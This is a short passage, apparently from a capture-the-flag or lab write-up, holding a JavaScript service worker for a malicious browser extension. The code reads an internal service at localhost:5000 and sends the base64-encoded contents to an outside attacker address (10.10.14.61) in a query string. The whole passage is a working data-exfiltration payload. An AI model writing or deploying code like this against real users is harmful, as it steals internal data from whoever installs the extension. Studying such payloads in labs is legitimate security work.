// simple JavaScript file (with the filename matching the service_worker defined in the JSON above) to read http://localhost:5000 and return it to me:

fetch("http://localhost:5000/")
  .then(r => r.text())
  .then(d => fetch("http://10.10.14.61/?d=" + btoa(d)));

